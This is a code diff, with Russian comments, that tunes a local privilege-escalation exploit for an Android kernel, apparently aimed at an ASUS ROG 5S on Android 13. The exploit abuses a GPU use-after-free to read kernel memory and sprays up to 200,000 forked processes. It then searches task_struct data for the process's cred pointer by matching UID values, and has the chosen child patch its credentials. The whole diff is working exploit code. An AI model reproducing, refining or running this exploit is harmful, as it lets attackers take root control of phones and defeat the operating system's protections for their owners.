@@ -1813,7 +1813,7 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
     dst_gpu = info.gpuaddr;
 
     // Сдвигаем окно сканирования в зависимости от номера батча
-    uint64_t scan_offset = (batch_idx * 0x1000000ULL) % UAF_SIZE; 
+    uint64_t scan_offset = (batch_idx * 0x800000ULL) % UAF_SIZE; // Уменьшили шаг для более тщательного поиска
     uint64_t current_va = UAF_START + scan_offset;
     uint64_t end_va = UAF_START + UAF_SIZE;
     
@@ -1828,9 +1828,9 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
         if (current_va >= end_va) current_va = UAF_START;
 
         double current_ram = get_ram_usage_percentage();
-        if (current_ram > 70.0 || (current_ram - initial_ram) > 20.0) {
+        if (current_ram > 95.0) { // Повысили порог до 95%
             fprintf(stderr, "\n[!] SCAN THROTTLING: RAM at %.1f%%. Cooling down...\n", current_ram);
-            usleep(1000000); // Пауза 1 сек
+            usleep(1000000); 
             continue; 
         }
 
@@ -1878,94 +1878,78 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                 uint64_t found_cred_ptr = 0;
                 uint32_t found_cred_off = 0;
 
-                fprintf(stderr, "    [*] Searching for UID %d in task_struct range (Deep Scan)...\n", my_uid);
-                
-                // Read a larger chunk of task_struct to find the real CRED pointer
-                // GKI 5.4 task_struct is large, cred can be anywhere from 0x500 to 0x800
-                uint8_t task_large[0x1000];
-                if (gpu_read_task_struct(fd, task_start_va, task_large, 0x1000) == 0) {
-                    for (int i = 0x400; i < 0x900; i += 8) {
-                        uint64_t ptr = *(uint64_t *)(task_large + i);
+                // Super Deep Scan for ROG 5S / Android 13
+                fprintf(stderr, "    [*] Searching for any app UID (10000-20000) in task_struct range 0x400-0xA00...\n");
+                uint8_t task_super[0x1000];
+                if (gpu_read_task_struct(fd, task_start_va, task_super, 0x1000) == 0) {
+                    for (int i = 0x400; i < 0xA00; i += 8) { // Расширили диапазон поиска
+                        uint64_t ptr = *(uint64_t *)(task_super + i);
                         if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
-                            uint32_t check_uids[8];
-                            if (gpu_read_task_struct(fd, ptr, (uint8_t *)check_uids, 32) == 0) {
-                                // In cred struct: usage(0), uid(4), gid(8), suid(12), sgid(16)...
-                                // We look for our UID at offset 4, 12, 20...
-                                if (check_uids[1] == my_uid || check_uids[2] == my_uid || check_uids[3] == my_uid) {
-                                    found_cred_ptr = ptr;
-                                    found_cred_off = i;
-                                    fprintf(stderr, "    [+] Found CRED pointer at offset 0x%x: 0x%lx (UID match!)\n", 
-                                            i, (unsigned long)ptr);
-                                    break;
-                                }
-                            }
-                        }
-                    }
-                }
-
-                if (!found_cred_ptr) {
-                    fprintf(stderr, "    [-] Deep Scan failed. Using standard offset 0x6b0 as fallback.\n");
-                    gpu_read_task_struct(fd, task_start_va + 0x6b0, (uint8_t *)&found_cred_ptr, 8);
-                }
-
-                if ((found_cred_ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
-                    uint32_t uids[8];
-                    if (gpu_read_task_struct(fd, found_cred_ptr, (uint8_t *)uids, 32) == 0) {
-                        int match = 0;
-                        for(int j=0; j<8; j++) if(uids[j] == my_uid) match++;
-                        
-                        fprintf(stderr, "    [*] Data at 0x%lx: %d %d %d %d %d %d %d %d\n", 
-                                (unsigned long)found_cred_ptr, 
-                                uids[0], uids[1], uids[2], uids[3], uids[4], uids[5], uids[6], uids[7]);
-                        
-                        int user_decision = 0;
-                        while (!user_decision) {
-                            fprintf(stderr, "\n    [>] Actions: [y] Use candidate, [n] Skip, [1] Hexdump Task, [2] Detailed CRED: ");
-                            fflush(stderr);
-                            
-                            char choice = 0;
-                            if (read(0, &choice, 1) > 0) {
-                                // Clean up newline
-                                char dummy;
-                                while(read(0, &dummy, 1) > 0 && dummy != '\n');
-
-                                if (choice == 'y' || choice == 'Y') {
-                                    marker_found = 1;
-                                    *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
-                                    *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
-                                    *(uint64_t *)&gbuf[GBUF_CRED_PTR] = found_cred_ptr;
-                                    *(uint32_t *)&gbuf[GBUF_COMM_OFF] = off; 
-                                    
-                                    for (int si = 0; si < SPRAY_COUNT_MAX; si++) {
-                                        if (spray_ctrl[si].pid == found_pid) {
-                                            spray_ctrl[si].do_action = 1;
+                            uint32_t check[16]; // Читаем больше для поиска UID
+                            if (gpu_read_task_struct(fd, ptr, (uint8_t *)check, 64) == 0) {
+                                // Ищем UID в первых 64 байтах структуры cred
+                                for (int j = 0; j < 12; j++) {
+                                    uint32_t val = check[j];
+                                    if (val >= 10000 && val <= 20000) {
+                                        // Если нашли UID, проверяем соседние поля (обычно uid == gid == suid == sgid)
+                                        if (check[j] == check[j+1] || check[j] == check[j+2]) {
+                                            found_cred_ptr = ptr;
+                                            found_cred_off = i;
+                                            fprintf(stderr, "    [+++] MATCH FOUND! Offset 0x%x -> Pointer 0x%lx (UID %u at cred+0x%x)\n", 
+                                                    i, (unsigned long)ptr, val, j*4);
                                             break;
                                         }
                                     }
-                                    fprintf(stderr, "\n[!!!] PROCEEDING with Task at 0x%lx\n", (unsigned long)task_start_va);
-                                    user_decision = 1;
-                                } else if (choice == 'n' || choice == 'N') {
-                                    fprintf(stderr, "    [-] Skipping candidate...\n");
-                                    user_decision = 1;
-                                } else if (choice == '1') {
-                                    uint8_t dump[512];
-                                    if (gpu_read_task_struct(fd, task_start_va + off - 256, dump, 512) == 0) {
-                                        hex_dump_internal("task_struct around marker", task_start_va + off - 256, dump, 512);
-                                    }
-                                } else if (choice == '2') {
-                                    uint8_t dump[256];
-                                    if (gpu_read_task_struct(fd, found_cred_ptr, dump, 256) == 0) {
-                                        hex_dump_internal("CRED structure", found_cred_ptr, dump, 256);
-                                        uint32_t *uids = (uint32_t *)dump;
-                                        fprintf(stderr, "    [CRED INFO] Usage: %u | UIDs: %u %u %u %u | GIDs: %u %u %u %u\n",
-                                                uids[0], uids[1], uids[2], uids[3], uids[4], uids[5], uids[6], uids[7], uids[8]);
-                                    }
                                 }
                             }
                         }
+                        if (found_cred_ptr) break;
                     }
-                } else {
-                    fprintf(stderr, "    [-] Invalid/Null CRED pointer.\n");
+                }
+
+                int user_decision = 0;
+                while (!user_decision) {
+                    fprintf(stderr, "\n    [>] Candidate PID %d at 0x%lx (Offset 0x%x)\n", found_pid, (unsigned long)task_start_va, off);
+                    fprintf(stderr, "    [>] Actions: [y] Use, [n] Skip, [1] Dump Task, [2] Dump CRED, [3] Custom Offset Dump: ");
+                    fflush(stderr);
+                    
+                    char choice = 0;
+                    if (read(0, &choice, 1) > 0) {
+                        char dummy; while(read(0, &dummy, 1) > 0 && dummy != '\n');
+
+                        if (choice == 'y' || choice == 'Y') {
+                            if (found_cred_ptr == 0) {
+                                fprintf(stderr, "    [!] Warning: No valid CRED found yet. Force use? (y/n): ");
+                                read(0, &choice, 1); while(read(0, &dummy, 1) > 0 && dummy != '\n');
+                                if (choice != 'y') continue;
+                                gpu_read_task_struct(fd, task_start_va + 0x6b0, (uint8_t *)&found_cred_ptr, 8);
+                            }
+                            marker_found = 1;
+                            *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
+                            *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
+                            *(uint64_t *)&gbuf[GBUF_CRED_PTR] = found_cred_ptr;
+                            user_decision = 1;
+                        } else if (choice == 'n' || choice == 'N') {
+                            user_decision = 1;
+                        } else if (choice == '1') {
+                            uint8_t d[512]; gpu_read_task_struct(fd, task_start_va + off - 256, d, 512);
+                            hex_dump_internal("task_struct", task_start_va + off - 256, d, 512);
+                        } else if (choice == '2') {
+                            uint8_t d[128]; 
+                            uint64_t p = found_cred_ptr ? found_cred_ptr : (*(uint64_t*)(task_super + 0x6b0));
+                            gpu_read_task_struct(fd, p, d, 128);
+                            hex_dump_internal("CRED", p, d, 128);
+                        } else if (choice == '3') {
+                            fprintf(stderr, "    Enter offset in hex (e.g. 6b8): ");
+                            char buf[16]; int len = read(0, buf, 15); buf[len] = 0;
+                            uint32_t custom_off = strtoul(buf, NULL, 16);
+                            uint64_t custom_ptr = 0;
+                            gpu_read_task_struct(fd, task_start_va + custom_off, (uint8_t *)&custom_ptr, 8);
+                            fprintf(stderr, "    Offset 0x%x contains pointer: 0x%lx\n", custom_off, (unsigned long)custom_ptr);
+                            uint8_t d[64]; gpu_read_task_struct(fd, custom_ptr, d, 64);
+                            hex_dump_internal("Custom Pointer Target", custom_ptr, d, 64);
+                        }
+                    }
                 }
             }
         }
@@ -2648,9 +2632,9 @@ restart:;
         fprintf(stderr, "    [!] Failed to free UAF: %s\n", strerror(errno));
     }
 
-    fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 100,000)\n");
-    int total_limit = 100000;
-    int batch_size = 2000; // Увеличили батч для более плотного спрея
+    fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 200,000)\n");
+    int total_limit = 200000;
+    int batch_size = 5000; // Увеличили батч для максимально плотного спрея
     int total_sprayed = 0;
     int marker_found_global = 0;
     int window_idx = 0;
@@ -2659,13 +2643,14 @@ restart:;
         double ram_usage = get_ram_usage_percentage();
         fprintf(stderr, "\r    [*] Sprayed: %d | RAM Usage: %.1f%% ... ", total_sprayed, ram_usage);
         
-        int reached_mem_limit = (ram_usage > 90.0); // Подняли до 90%
+        int reached_mem_limit = (ram_usage > 95.0); // Подняли до 95% для ROG 5S
         
         if (!reached_mem_limit || total_sprayed == 0) {
             for (int i = 0; i < batch_size && total_sprayed < total_limit; i++) {
                 pid_t pid = fork();
                 if (pid == 0) {
-                    // Оптимизация ребенка: закрываем лишние файлы
+                    // Максимальная оптимизация ребенка
+                    if (fd > 0) close(fd);
                     if (fd_lib > 0) close(fd_lib);
                     if (fd_shellcode > 0) close(fd_shellcode);
                     
@@ -2674,15 +2659,15 @@ restart:;
                     prctl(PR_SET_NAME, proc_name, 0, 0, 0);
                     prctl(PR_SET_PDEATHSIG, SIGKILL);
                     
-                    // Ребенок просто спит и ждет команды через общую память
+                    // Ребенок спит очень долго, чтобы не нагружать CPU
                     while(1) { 
                         if (gbuf[0] == 0xab) {
-                            if (getpid() == (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID])) {
+                            uint64_t target = *(uint64_t *)&gbuf[GBUF_TARGET_PID];
+                            if (getpid() == (pid_t)target) {
                                 safe_cred_patch();
                             }
                         }
-                        // Большой интервал сна, чтобы не грузить CPU
-                        usleep(500000); 
+                        usleep(1000000); 
                     }
                     _exit(0);
                 }
@@ -2690,16 +2675,18 @@ restart:;
                     spray_ctrl[total_sprayed].pid = pid;
                     spray_ctrl[total_sprayed].do_action = 0;
                     total_sprayed++;
+                } else if (errno == EAGAIN) {
+                    fprintf(stderr, "\n[!] fork() EAGAIN at %d sprays. Throttling...\n", total_sprayed);
+                    break;
                 }
             }
-            // Короткая пауза после большой пачки
-            usleep(20000); 
+            usleep(50000); // Даем системе время на аллокацию
         }
 
-        // Сканируем чаще (каждые 2000 или по лимиту памяти)
-        if (reached_mem_limit || (total_sprayed > 0 && total_sprayed % 2000 == 0) || total_sprayed >= total_limit) {
+        // Сканируем каждые batch_size или по лимиту памяти
+        if (reached_mem_limit || (total_sprayed > 0 && total_sprayed % batch_size == 0) || total_sprayed >= total_limit) {
             fprintf(stderr, "\n    [!] %s. Starting scan (Window %d)...\n", 
-                    reached_mem_limit ? "Memory limit (90%) reached" : "Batch complete", window_idx);
+                    reached_mem_limit ? "Memory limit (95%) reached" : "Batch complete", window_idx);
             
             int num_found = 0;
             if (scan_uaf_for_nonzero_multi(fd, window_idx++, &num_found)) {
